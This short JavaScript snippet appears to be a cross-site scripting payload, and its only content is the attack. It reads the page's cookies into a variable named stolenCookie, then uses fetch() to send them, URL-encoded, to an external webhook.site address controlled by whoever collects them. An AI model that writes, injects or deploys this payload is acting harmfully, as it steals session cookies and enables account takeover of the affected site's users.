const stolenCookie = document.cookie;
fetch('https://webhook.site/1293cb30-e705-48fe-b307-5790d46650f3?data=' + encodeURIComponent(stolenCookie));
